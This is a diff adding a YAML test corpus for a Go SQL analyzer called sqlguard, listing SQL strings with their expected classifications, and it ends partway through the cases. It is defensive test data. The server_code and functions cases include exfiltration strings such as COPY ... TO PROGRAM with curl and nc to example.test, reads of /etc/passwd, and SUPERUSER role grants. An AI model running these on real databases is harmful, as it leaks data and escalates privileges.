@@ -1,0 +1,2831 @@
+# sqlguard corpus: the executable description of what Analyze reports (docs/SQLGUARD.md is the prose one).
+#
+# Each case is one SQL string (or a generated one, `gen`) and the facts that matter for it. Fields left
+# out of `expect` are not checked. Every case sets at least kind, category, statements and ambiguous.
+#
+# Two runners read this file:
+#   - TestCorpus (unit, pure Go):           go test ./internal/sqlguard/ -run TestCorpus
+#     checks every case's `expect` against Analyze(sql, Options{}).
+#   - TestCorpusDifferential (integration): make integration   (corpus_integration_test.go)
+#     runs every `differential: true` case on a throwaway Postgres inside BEGIN ... ROLLBACK, after
+#     resetting schema public and running `setup`, and checks that Postgres's command tags agree with
+#     Analyze's kinds and statement count. Cases Postgres rejects as a syntax error (42601) must be
+#     ambiguous or kind "other". server_code cases, dangerous functions, COPY ... PROGRAM and role or
+#     ALTER SYSTEM statements are never run; the test refuses a case that would.
+#
+# Families (id prefix): read (R), write (W), cte (C), ddl (D), privilege (D04/D05/O12/P),
+# server_code (S01-S04, S12+), functions (S05-S11, F), multi (M), obfuscation (O), session (SE, O13),
+# transaction (TX), maintenance (MA, O14), limits (O16, L).
+#
+# Optional `min_pg` skips a differential case on older servers (RETURNING old/new needs 18;
+# MERGE ... RETURNING needs 17). Non-ASCII and control characters are written as YAML escapes
+# (\u200b, \0, \r) so nothing in this file is invisible.
+version: 1
+
+setup: |
+  CREATE TABLE public.orders (id int PRIMARY KEY, status text, s text, customer_id int, total numeric);
+  CREATE TABLE public.customers (id int PRIMARY KEY, name text);
+  CREATE TABLE public.support_notes (order_id int, body text);
+  CREATE TABLE public.order_tags (order_id int, tag text);
+  CREATE TABLE public.staging (id int, status text);
+  CREATE TABLE public.t (id int, "DROP" text);
+  CREATE TABLE public.x (id int);
+  CREATE TABLE public."Weird""Name" (id int);
+  CREATE TABLE public."orders; DROP TABLE x" (id int);
+  CREATE SEQUENCE public.orders_id_seq;
+  CREATE MATERIALIZED VIEW public.customer_names AS SELECT id, name FROM public.customers;
+  INSERT INTO public.orders VALUES (1, 'open', 'a', 1, 10), (2, 'shipped', 'b', 2, 20), (42, 'open', 'c', 1, 42);
+  INSERT INTO public.customers VALUES (1, 'Asha'), (2, 'Ravi');
+  INSERT INTO public.staging VALUES (1, 'closed'), (7, 'new');
+  INSERT INTO public.order_tags VALUES (1, 'spam');
+  INSERT INTO public.t VALUES (1, 'x');
+  INSERT INTO public.x VALUES (1);
+  DROP SCHEMA IF EXISTS app CASCADE;
+  CREATE SCHEMA app;
+  CREATE FUNCTION app.cleanup_everything() RETURNS int LANGUAGE sql AS 'SELECT 0';
+
+cases:
+  # ---------------------------------------------------------------- read
+  - id: R01
+    family: read
+    sql: "SELECT id, status FROM public.orders WHERE id = 42"
+    differential: true
+    expect:
+      kind: select
+      category: read
+      kinds: [select]
+      statements: 1
+      multi: false
+      writes: false
+      write_kinds: []
+      has_where: false
+      tables: [public.orders]
+      tables_complete: true
+      functions: []
+      ambiguous: false
+      reasons: []
+      bytes: 50
+
+  - id: R02
+    family: read
+    sql: "select * from orders limit 5"
+    note: an unqualified name gets the default schema
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      writes: false
+      tables: [public.orders]
+      tables_complete: true
+      ambiguous: false
+
+  - id: R03
+    family: read
+    sql: "WITH r AS (SELECT * FROM orders) SELECT count(*) FROM r"
+    note: the CTE name r is not a table
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      writes: false
+      cte_write: false
+      tables: [public.orders]
+      functions: [count]
+      unknown_functions: []
+      ambiguous: false
+
+  - id: R04a
+    family: read
+    sql: "TABLE orders"
+    differential: true
+    expect:
+      kind: select
+      category: read
+      kinds: [select]
+      statements: 1
+      writes: false
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: R04b
+    family: read
+    sql: "VALUES (1),(2)"
+    differential: true
+    expect:
+      kind: select
+      category: read
+      kinds: [select]
+      statements: 1
+      writes: false
+      tables: []
+      tables_complete: true
+      functions: []
+      ambiguous: false
+
+  - id: R05a
+    family: read
+    sql: "SELECT 'DROP TABLE orders'"
+    note: keywords inside a string are not seen
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      writes: false
+      tables: []
+      ambiguous: false
+
+  - id: R05b
+    family: read
+    sql: "SELECT $$ DELETE FROM x $$"
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      writes: false
+      write_kinds: []
+      tables: []
+      ambiguous: false
+
+  - id: R06
+    family: read
+    sql: "SELECT \"DROP\" FROM t"
+    note: a quoted identifier is a name, not a keyword
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      writes: false
+      tables: [public.t]
+      ambiguous: false
+
+  - id: R07
+    family: read
+    sql: "SELECT * FROM orders FOR UPDATE"
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      writes: false
+      locks_rows: true
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: R08a
+    family: read
+    sql: "SELECT 1;"
+    differential: true
+    expect:
+      kind: select
+      category: read
+      kinds: [select]
+      statements: 1
+      multi: false
+      ambiguous: false
+
+  - id: R08b
+    family: read
+    sql: "SELECT 1; -- done"
+    note: a trailing comment after the last semicolon is an empty statement
+    differential: true
+    expect:
+      kind: select
+      category: read
+      kinds: [select]
+      statements: 1
+      multi: false
+      ambiguous: false
+
+  - id: R09
+    family: read
+    sql: "-- only a comment"
+    differential: true
+    expect:
+      kind: empty
+      category: none
+      kinds: []
+      statements: 0
+      multi: false
+      writes: false
+      tables: []
+      ambiguous: false
+      reasons: []
+
+  - id: R10
+    family: read
+    sql: "select/*a*/*/*b*/from/*c*/orders"
+    note: comments with no whitespace around them, including right after the star
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      tables: [public.orders]
+      tables_complete: true
+      ambiguous: false
+
+  - id: R11
+    family: read
+    sql: "SELECT * FROM orders WHERE status = 'open' FOR SHARE"
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      writes: false
+      locks_rows: true
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: R12
+    family: read
+    sql: "(SELECT 1)"
+    note: a parenthesised leading statement
+    differential: true
+    expect:
+      kind: select
+      category: read
+      kinds: [select]
+      statements: 1
+      ambiguous: false
+
+  - id: R13
+    family: read
+    sql: "SELECT 1 WHERE EXISTS (SELECT 1 FROM orders)"
+    note: exists is a keyword, not a function; the subquery's table is found
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      tables: [public.orders]
+      tables_complete: true
+      functions: []
+      ambiguous: false
+
+  - id: R14
+    family: read
+    sql: "SELECT * FROM generate_series(1,3)"
+    note: a function in FROM makes the table list incomplete; it is not a table
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      tables: []
+      tables_complete: false
+      functions: [generate_series]
+      unknown_functions: []
+      ambiguous: false
+
+  - id: R15
+    family: read
+    sql: "SELECT * FROM a.b.c"
+    note: three-part name; Postgres rejects it with 0A000 (cross-database reference), not a syntax error
+    differential: false
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      tables_complete: false
+      ambiguous: false
+
+  - id: R16
+    family: read
+    sql: "SELECT o.id, c.name FROM orders o JOIN customers c ON c.id = o.customer_id WHERE o.status = 'open'"
+    note: aliases are not tables
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      tables: [public.customers, public.orders]
+      tables_complete: true
+      functions: []
+      ambiguous: false
+
+  - id: R17
+    family: read
+    sql: "SELECT \"Weird\"\"Name\".id FROM public.\"Weird\"\"Name\""
+    note: a quoted identifier keeps its case and unescapes the doubled quote
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      tables: ["public.Weird\"Name"]
+      ambiguous: false
+
+  - id: R18
+    family: read
+    sql: ""
+    note: the empty string
+    differential: true
+    expect:
+      kind: empty
+      category: none
+      kinds: []
+      statements: 0
+      multi: false
+      writes: false
+      ambiguous: false
+      reasons: []
+      bytes: 0
+
+  - id: R19
+    family: read
+    sql: ";;;"
+    note: only semicolons
+    differential: true
+    expect:
+      kind: empty
+      category: none
+      kinds: []
+      statements: 0
+      multi: false
+      ambiguous: false
+
+  - id: R20
+    family: read
+    sql: "SELECT id FROM orders WHERE id = 1"
+    note: invariance pair with R21
+    differential: true
+    expect:
+      kind: select
+      category: read
+      kinds: [select]
+      statements: 1
+      multi: false
+      writes: false
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: R21
+    family: read
+    sql: "  select\n\tID\nfrom   ORDERS where id=1  "
+    note: invariance pair with R20 (case and whitespace)
+    differential: true
+    expect:
+      kind: select
+      category: read
+      kinds: [select]
+      statements: 1
+      multi: false
+      writes: false
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: R22
+    family: read
+    sql: "SELECT o.id, l.name FROM orders o, LATERAL (SELECT name FROM customers c WHERE c.id = o.customer_id) l"
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      tables_complete: false
+      ambiguous: false
+
+  - id: R23
+    family: read
+    sql: "SELECT * FROM ROWS FROM (generate_series(1,2), generate_series(1,3))"
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      tables_complete: false
+      functions: [generate_series]
+      ambiguous: false
+
+  - id: R24
+    family: read
+    sql: "SELECT $1"
+    note: a lone parameter; Postgres rejects it with 42P02 when no value is bound
+    differential: false
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      writes: false
+      tables: []
+      ambiguous: false
+
+  - id: R25
+    family: read
+    sql: "SELECT count(*) FROM orders o WHERE o.total > 5 GROUP BY o.status ORDER BY 1 LIMIT 10 OFFSET 0"
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      writes: false
+      write_kinds: []
+      has_where: false
+      unbounded_write: false
+      tables: [public.orders]
+      functions: [count]
+      ambiguous: false
+
+  # ---------------------------------------------------------------- write
+  - id: W01
+    family: write
+    sql: "INSERT INTO public.support_notes (order_id, body) VALUES (42, 'Called')"
+    differential: true
+    expect:
+      kind: insert
+      category: write
+      kinds: [insert]
+      statements: 1
+      writes: true
+      write_kinds: [insert]
+      has_where: false
+      unbounded_write: false
+      tables: [public.support_notes]
+      ambiguous: false
+
+  - id: W02
+    family: write
+    sql: "UPDATE orders SET status = 'shipped' WHERE id = 42"
+    differential: true
+    expect:
+      kind: update
+      category: write
+      statements: 1
+      writes: true
+      write_kinds: [update]
+      has_where: true
+      unbounded_write: false
+      where_trivial: false
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: W03
+    family: write
+    sql: "UPDATE orders SET status = 'shipped'"
+    differential: true
+    expect:
+      kind: update
+      category: write
+      statements: 1
+      writes: true
+      write_kinds: [update]
+      has_where: false
+      unbounded_write: true
+      where_trivial: false
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: W04a
+    family: write
+    sql: "DELETE FROM orders WHERE true"
+    differential: true
+    expect:
+      kind: delete
+      category: write
+      statements: 1
+      writes: true
+      write_kinds: [delete]
+      has_where: true
+      unbounded_write: true
+      where_trivial: true
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: W04b
+    family: write
+    sql: "DELETE FROM orders WHERE 1=1"
+    differential: true
+    expect:
+      kind: delete
+      category: write
+      statements: 1
+      write_kinds: [delete]
+      has_where: true
+      unbounded_write: true
+      where_trivial: true
+      ambiguous: false
+
+  - id: W05
+    family: write
+    sql: "DELETE FROM orders o USING customers c WHERE o.customer_id = c.id"
+    differential: true
+    expect:
+      kind: delete
+      category: write
+      statements: 1
+      write_kinds: [delete]
+      has_where: true
+      unbounded_write: false
+      where_trivial: false
+      tables: [public.customers, public.orders]
+      ambiguous: false
+
+  - id: W06
+    family: write
+    sql: "UPDATE orders SET s='x' WHERE id=42 RETURNING old.s, new.s"
+    note: RETURNING old/new needs PostgreSQL 18
+    differential: true
+    min_pg: 18
+    expect:
+      kind: update
+      category: write
+      statements: 1
+      write_kinds: [update]
+      has_where: true
+      unbounded_write: false
+      has_returning: true
+      tables: [public.orders]
+      functions: []
+      ambiguous: false
+
+  - id: W07
+    family: write
+    sql: "MERGE INTO orders o USING staging s ON o.id = s.id WHEN MATCHED THEN DELETE RETURNING merge_action()"
+    note: MERGE ... RETURNING needs PostgreSQL 17
+    differential: true
+    min_pg: 17
+    expect:
+      kind: merge
+      category: write
+      statements: 1
+      writes: true
+      write_kinds: [delete]
+      unbounded_write: false
+      has_returning: true
+      tables: [public.orders, public.staging]
+      functions: [merge_action]
+      unknown_functions: []
+      ambiguous: false
+
+  - id: W08
+    family: write
+    sql: "INSERT INTO orders (id, status) VALUES (42, 'new') ON CONFLICT (id) DO UPDATE SET status = excluded.status"
+    differential: true
+    expect:
+      kind: insert
+      category: write
+      statements: 1
+      writes: true
+      write_kinds: [insert, update]
+      has_where: false
+      unbounded_write: false
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: W09
+    family: write
+    sql: "SELECT * INTO orders_copy FROM orders"
+    note: SELECT INTO creates a table, so it is ddl; Postgres tags it SELECT
+    differential: true
+    expect:
+      kind: select
+      category: ddl
+      kinds: [select]
+      statements: 1
+      writes: true
+      write_kinds: []
+      select_into: true
+      tables: [public.orders, public.orders_copy]
+      ambiguous: false
+
+  - id: W10a
+    family: write
+    sql: "COPY orders FROM STDIN"
+    note: the simple-protocol runner can't feed COPY data
+    differential: false
+    expect:
+      kind: copy
+      category: write
+      statements: 1
+      writes: true
+      write_kinds: [copy]
+      copy_program: false
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: W10b
+    family: write
+    sql: "COPY orders TO STDOUT"
+    note: the simple-protocol runner can't read COPY data
+    differential: false
+    expect:
+      kind: copy
+      category: read
+      statements: 1
+      writes: false
+      write_kinds: []
+      copy_program: false
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: W11
+    family: write
+    sql: "UPDATE orders SET status = c.name FROM customers c WHERE c.id = orders.customer_id"
+    differential: true
+    expect:
+      kind: update
+      category: write
+      statements: 1
+      write_kinds: [update]
+      has_where: true
+      unbounded_write: false
+      tables: [public.customers, public.orders]
+      ambiguous: false
+
+  - id: W12
+    family: write
+    sql: "INSERT INTO staging (id, status) SELECT id, status FROM orders WHERE status = 'open'"
+    differential: true
+    expect:
+      kind: insert
+      category: write
+      statements: 1
+      write_kinds: [insert]
+      has_where: false
+      unbounded_write: false
+      tables: [public.orders, public.staging]
+      ambiguous: false
+
+  - id: W13
+    family: write
+    sql: "DELETE FROM orders WHERE 2=2"
+    differential: true
+    expect:
+      kind: delete
+      category: write
+      statements: 1
+      has_where: true
+      unbounded_write: true
+      where_trivial: true
+      ambiguous: false
+
+  - id: W14
+    family: write
+    sql: "DELETE FROM orders WHERE 'a'='a'"
+    differential: true
+    expect:
+      kind: delete
+      category: write
+      statements: 1
+      has_where: true
+      unbounded_write: true
+      where_trivial: true
+      ambiguous: false
+
+  - id: W15
+    family: write
+    sql: "UPDATE orders SET status = 'x' WHERE id=id"
+    differential: true
+    expect:
+      kind: update
+      category: write
+      statements: 1
+      has_where: true
+      unbounded_write: true
+      where_trivial: true
+      ambiguous: false
+
+  - id: W16
+    family: write
+    sql: "DELETE FROM orders WHERE NOT false"
+    differential: true
+    expect:
+      kind: delete
+      category: write
+      statements: 1
+      has_where: true
+      unbounded_write: true
+      where_trivial: true
+      ambiguous: false
+
+  - id: W17
+    family: write
+    sql: "DELETE FROM orders WHERE (true)"
+    differential: true
+    expect:
+      kind: delete
+      category: write
+      statements: 1
+      has_where: true
+      unbounded_write: true
+      where_trivial: true
+      ambiguous: false
+
+  - id: W18
+    family: write
+    sql: "UPDATE orders SET total = total * 2 WHERE id = 1 RETURNING id, total"
+    differential: true
+    expect:
+      kind: update
+      category: write
+      statements: 1
+      write_kinds: [update]
+      has_where: true
+      unbounded_write: false
+      where_trivial: false
+      has_returning: true
+      ambiguous: false
+
+  - id: W19
+    family: write
+    sql: "DELETE FROM orders"
+    differential: true
+    expect:
+      kind: delete
+      category: write
+      statements: 1
+      writes: true
+      write_kinds: [delete]
+      has_where: false
+      unbounded_write: true
+      where_trivial: false
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: W20
+    family: write
+    sql: "DELETE FROM orders WHERE id = 1"
+    note: invariance pair with W21
+    differential: true
+    expect:
+      kind: delete
+      category: write
+      kinds: [delete]
+      statements: 1
+      multi: false
+      writes: true
+      write_kinds: [delete]
+      has_where: true
+      unbounded_write: false
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: W21
+    family: write
+    sql: "delete   from\n Orders\twhere ID = 1"
+    note: invariance pair with W20 (case and whitespace)
+    differential: true
+    expect:
+      kind: delete
+      category: write
+      kinds: [delete]
+      statements: 1
+      multi: false
+      writes: true
+      write_kinds: [delete]
+      has_where: true
+      unbounded_write: false
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: W22
+    family: write
+    sql: "MERGE INTO orders o USING staging s ON o.id = s.id WHEN MATCHED THEN UPDATE SET status = s.status WHEN NOT MATCHED THEN INSERT (id, status) VALUES (s.id, s.status)"
+    differential: true
+    expect:
+      kind: merge
+      category: write
+      statements: 1
+      writes: true
+      write_kinds: [insert, update]
+      has_where: false
+      unbounded_write: false
+      tables: [public.orders, public.staging]
+      ambiguous: false
+
+  # ---------------------------------------------------------------- cte
+  - id: C01
+    family: cte
+    sql: "WITH d AS (DELETE FROM orders RETURNING *) SELECT count(*) FROM d"
+    differential: true
+    expect:
+      kind: select
+      category: write
+      kinds: [select]
+      statements: 1
+      writes: true
+      write_kinds: [delete]
+      has_where: false
+      unbounded_write: true
+      has_returning: true
+      cte_write: true
+      tables: [public.orders]
+      functions: [count]
+      ambiguous: false
+
+  - id: C02
+    family: cte
+    sql: "WITH u AS (UPDATE orders SET s='x' WHERE id=1 RETURNING id) SELECT * FROM u"
+    differential: true
+    expect:
+      kind: select
+      category: write
+      statements: 1
+      writes: true
+      write_kinds: [update]
+      unbounded_write: false
+      where_trivial: false
+      has_returning: true
+      cte_write: true
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: C03
+    family: cte
+    sql: "WITH RECURSIVE t(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM t WHERE n<9) SELECT * FROM t"
+    note: t is a CTE (it shadows public.t); t(n) is a column list, not a call
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      writes: false
+      cte_write: false
+      tables: []
+      tables_complete: true
+      functions: []
+      ambiguous: false
+
+  - id: C04
+    family: cte
+    sql: "WITH d AS MATERIALIZED (DELETE FROM orders WHERE id = 1 RETURNING id) SELECT * FROM d"
+    differential: true
+    expect:
+      kind: select
+      category: write
+      statements: 1
+      writes: true
+      write_kinds: [delete]
+      unbounded_write: false
+      has_returning: true
+      cte_write: true
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: C05
+    family: cte
+    sql: "WITH o AS NOT MATERIALIZED (SELECT * FROM orders WHERE status = 'open') SELECT id FROM o"
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      writes: false
+      cte_write: false
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: C06
+    family: cte
+    sql: "WITH i AS (INSERT INTO support_notes (order_id, body) VALUES (1, 'x') RETURNING order_id) UPDATE orders SET status = 'noted' WHERE id IN (SELECT order_id FROM i)"
+    differential: true
+    expect:
+      kind: update
+      category: write
+      kinds: [update]
+      statements: 1
+      writes: true
+      write_kinds: [insert, update]
+      has_where: true
+      unbounded_write: false
+      has_returning: true
+      cte_write: true
+      tables: [public.orders, public.support_notes]
+      ambiguous: false
+
+  - id: C07
+    family: cte
+    sql: "WITH a AS (SELECT id FROM orders), b AS (DELETE FROM staging WHERE true RETURNING id) SELECT * FROM a JOIN b USING (id)"
+    note: the second CTE writes, with a trivial WHERE; USING (id) is a join column list
+    differential: true
+    expect:
+      kind: select
+      category: write
+      statements: 1
+      writes: true
+      write_kinds: [delete]
+      unbounded_write: true
+      where_trivial: true
+      cte_write: true
+      tables: [public.orders, public.staging]
+      ambiguous: false
+
+  - id: C08
+    family: cte
+    sql: "WITH x AS (SELECT 1 AS id) SELECT * FROM x"
+    note: a CTE named like a real table (public.x) still hides it
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      writes: false
+      tables: []
+      ambiguous: false
+
+  # ---------------------------------------------------------------- ddl
+  - id: D01a
+    family: ddl
+    sql: "DROP TABLE orders"
+    differential: true
+    expect:
+      kind: drop
+      category: ddl
+      kinds: [drop]
+      statements: 1
+      writes: true
+      write_kinds: []
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: D01b
+    family: ddl
+    sql: "drop table if exists public.orders cascade"
+    differential: true
+    expect:
+      kind: drop
+      category: ddl
+      statements: 1
+      writes: true
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: D02
+    family: ddl
+    sql: "TRUNCATE TABLE ONLY orders, customers RESTART IDENTITY"
+    differential: true
+    expect:
+      kind: truncate
+      category: ddl
+      statements: 1
+      writes: true
+      write_kinds: []
+      tables: [public.customers, public.orders]
+      ambiguous: false
+
+  - id: D03
+    family: ddl
+    sql: "CREATE OR REPLACE FUNCTION f() RETURNS trigger AS $$ BEGIN RETURN NEW; END $$ LANGUAGE plpgsql"
+    note: creating a function is ddl; its body is invisible, so the table list is incomplete
+    differential: true
+    expect:
+      kind: create
+      category: ddl
+      statements: 1
+      writes: true
+      tables: []
+      tables_complete: false
+      ambiguous: false
+
+  - id: D06
+    family: ddl
+    sql: "CREATE INDEX orders_status_idx ON orders (status)"
+    differential: true
+    expect:
+      kind: create
+      category: ddl
+      statements: 1
+      writes: true
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: D07
+    family: ddl
+    sql: "ALTER TABLE orders ADD COLUMN note text"
+    differential: true
+    expect:
+      kind: alter
+      category: ddl
+      statements: 1
+      writes: true
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: D08
+    family: ddl
+    sql: "COMMENT ON TABLE orders IS 'customer orders'"
+    differential: true
+    expect:
+      kind: comment
+      category: ddl
+      statements: 1
+      writes: true
+      ambiguous: false
+
+  - id: D09
+    family: ddl
+    sql: "CREATE TABLE public.audit_log (id int, body text)"
+    differential: true
+    expect:
+      kind: create
+      category: ddl
+      statements: 1
+      writes: true
+      tables: [public.audit_log]
+      ambiguous: false
+
+  - id: D10
+    family: ddl
+    sql: "CREATE VIEW open_orders AS SELECT id FROM orders WHERE status = 'open'"
+    differential: true
+    expect:
+      kind: create
+      category: ddl
+      statements: 1
+      writes: true
+      tables: [public.open_orders, public.orders]
+      ambiguous: false
+
+  - id: D11
+    family: ddl
+    sql: "DROP TABLE IF EXISTS staging, x"
+    differential: true
+    expect:
+      kind: drop
+      category: ddl
+      statements: 1
+      writes: true
+      tables: [public.staging, public.x]
+      ambiguous: false
+
+  - id: D12
+    family: ddl
+    sql: "DROP FUNCTION IF EXISTS f()"
+    note: a function target is not a table, so the list is incomplete
+    differential: true
+    expect:
+      kind: drop
+      category: ddl
+      statements: 1
+      writes: true
+      tables: []
+      tables_complete: false
+      ambiguous: false
+
+  - id: D13
+    family: ddl
+    sql: "SECURITY LABEL ON TABLE orders IS 'secret'"
+    note: needs a label provider; Postgres rejects it without one (22023)
+    differential: false
+    expect:
+      kind: security_label
+      category: ddl
+      statements: 1
+      writes: true
+      ambiguous: false
+
+  - id: D14
+    family: ddl
+    sql: "IMPORT FOREIGN SCHEMA remote FROM SERVER other_db INTO public"
+    note: needs a foreign server
+    differential: false
+    expect:
+      kind: import
+      category: ddl
+      statements: 1
+      writes: true
+      ambiguous: false
+
+  # ---------------------------------------------------------------- privilege
+  - id: D04a
+    family: privilege
+    sql: "GRANT ALL ON orders TO PUBLIC"
+    differential: true
+    expect:
+      kind: grant
+      category: privilege
+      statements: 1
+      writes: true
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: D04b
+    family: privilege
+    sql: "ALTER ROLE deedglass_agent SUPERUSER"
+    note: role statements are never run
+    differential: false
+    expect:
+      kind: alter
+      category: privilege
+      statements: 1
+      writes: true
+      tables: []
+      tables_complete: true
+      ambiguous: false
+
+  - id: D05
+    family: privilege
+    sql: "ALTER SYSTEM SET wal_level = minimal"
+    note: ALTER SYSTEM is never run
+    differential: false
+    expect:
+      kind: alter
+      category: privilege
+      statements: 1
+      writes: true
+      tables: []
+      tables_complete: true
+      ambiguous: false
+
+  - id: O12a
+    family: privilege
+    sql: "SET ROLE postgres"
+    note: role statements are never run
+    differential: false
+    expect:
+      kind: set
+      category: privilege
+      statements: 1
+      writes: true
+      ambiguous: false
+
+  - id: O12b
+    family: privilege
+    sql: "SET SESSION AUTHORIZATION 'x'"
+    note: role statements are never run
+    differential: false
+    expect:
+      kind: set
+      category: privilege
+      statements: 1
+      writes: true
+      ambiguous: false
+
+  - id: P01
+    family: privilege
+    sql: "REVOKE ALL ON orders FROM PUBLIC"
+    differential: true
+    expect:
+      kind: revoke
+      category: privilege
+      statements: 1
+      writes: true
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: P02
+    family: privilege
+    sql: "CREATE ROLE agent_admin SUPERUSER LOGIN"
+    note: role statements are never run
+    differential: false
+    expect:
+      kind: create
+      category: privilege
+      statements: 1
+      writes: true
+      tables: []
+      tables_complete: true
+      ambiguous: false
+
+  - id: P03
+    family: privilege
+    sql: "GRANT SELECT ON TABLE customers TO deedglass_app"
+    note: deedglass_app exists on every throwaway cluster (storetest creates it); rolled back
+    differential: true
+    expect:
+      kind: grant
+      category: privilege
+      statements: 1
+      writes: true
+      tables: [public.customers]
+      ambiguous: false
+
+  - id: P04
+    family: privilege
+    sql: "REASSIGN OWNED BY deedglass_app TO postgres"
+    note: role statements are never run
+    differential: false
+    expect:
+      kind: reassign
+      category: privilege
+      statements: 1
+      writes: true
+      ambiguous: false
+
+  - id: P05
+    family: privilege
+    sql: "DROP OWNED BY deedglass_app"
+    note: role statements are never run
+    differential: false
+    expect:
+      kind: drop
+      category: privilege
+      statements: 1
+      writes: true
+      ambiguous: false
+
+  - id: P06
+    family: privilege
+    sql: "ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT SELECT ON TABLES TO PUBLIC"
+    differential: true
+    expect:
+      kind: alter
+      category: privilege
+      statements: 1
+      writes: true
+      ambiguous: false
+
+  - id: P07
+    family: privilege
+    sql: "RESET ROLE"
+    note: role statements are never run
+    differential: false
+    expect:
+      kind: reset
+      category: privilege
+      statements: 1
+      writes: true
+      ambiguous: false
+
+  # ---------------------------------------------------------------- server_code (never run)
+  - id: S01
+    family: server_code
+    sql: "DO $$ BEGIN EXECUTE 'DROP TABLE orders'; END $$"
+    differential: false
+    expect:
+      kind: do
+      category: server_code
+      kinds: [do]
+      statements: 1
+      writes: true
+      tables: []
+      tables_complete: false
+      functions: []
+      ambiguous: false
+
+  - id: S02
+    family: server_code
+    sql: "COPY orders TO PROGRAM 'curl -d @- https://example.test'"
+    differential: false
+    expect:
+      kind: copy
+      category: server_code
+      statements: 1
+      writes: true
+      copy_program: true
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: S03a
+    family: server_code
+    sql: "COPY (SELECT 1) TO PROGRAM 'id'"
+    differential: false
+    expect:
+      kind: copy
+      category: server_code
+      statements: 1
+      writes: true
+      copy_program: true
+      tables: []
+      ambiguous: false
+
+  - id: S03b
+    family: server_code
+    sql: "COPY orders FROM PROGRAM 'cat /etc/passwd'"
+    differential: false
+    expect:
+      kind: copy
+      category: server_code
+      statements: 1
+      writes: true
+      write_kinds: [copy]
+      copy_program: true
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: S04a
+    family: server_code
+    sql: "CALL archive_orders(30)"
+    differential: false
+    expect:
+      kind: call
+      category: server_code
+      statements: 1
+      writes: true
+      tables_complete: false
+      functions: [archive_orders]
+      unknown_functions: [archive_orders]
+      ambiguous: false
+
+  - id: S04b
+    family: server_code
+    sql: "LOAD 'plpython3u'"
+    differential: false
+    expect:
+      kind: load
+      category: server_code
+      statements: 1
+      writes: true
+      ambiguous: false
+
+  - id: S12
+    family: server_code
+    sql: "do $body$ begin perform pg_sleep(1); end $body$"
+    note: calls inside a dollar-quoted body are not seen
+    differential: false
+    expect:
+      kind: do
+      category: server_code
+      statements: 1
+      writes: true
+      functions: []
+      dangerous_functions: []
+      ambiguous: false
+
+  - id: S13
+    family: server_code
+    sql: "copy orders from program $$cat /etc/passwd$$"
+    note: the program as a dollar-quoted string
+    differential: false
+    expect:
+      kind: copy
+      category: server_code
+      statements: 1
+      writes: true
+      write_kinds: [copy]
+      copy_program: true
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: S14
+    family: server_code
+    sql: "SELECT 1; DO $$ BEGIN NULL; END $$"
+    differential: false
+    expect:
+      kind: select
+      category: server_code
+      kinds: [select, do]
+      statements: 2
+      multi: true
+      writes: true
+      ambiguous: false
+
+  - id: S15
+    family: server_code
+    sql: "COPY (SELECT * FROM orders) TO PROGRAM 'nc example.test 9'"
+    differential: false
+    expect:
+      kind: copy
+      category: server_code
+      statements: 1
+      writes: true
+      copy_program: true
+      tables: [public.orders]
+      ambiguous: false
+
+  # ---------------------------------------------------------------- functions
+  - id: S05
+    family: functions
+    sql: "SELECT pg_read_file('/etc/passwd')"
+    differential: false
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      functions: [pg_read_file]
+      dangerous_functions: [pg_read_file]
+      write_functions: []
+      unknown_functions: []
+      ambiguous: false
+
+  - id: S06
+    family: functions
+    sql: "SELECT dblink_exec('dbname=x', 'DROP TABLE orders')"
+    differential: false
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      tables: []
+      functions: [dblink_exec]
+      dangerous_functions: [dblink_exec]
+      unknown_functions: []
+      ambiguous: false
+
+  - id: S07
+    family: functions
+    sql: "SELECT pg_logical_emit_message(true, 'deedglass', 'act_01')"
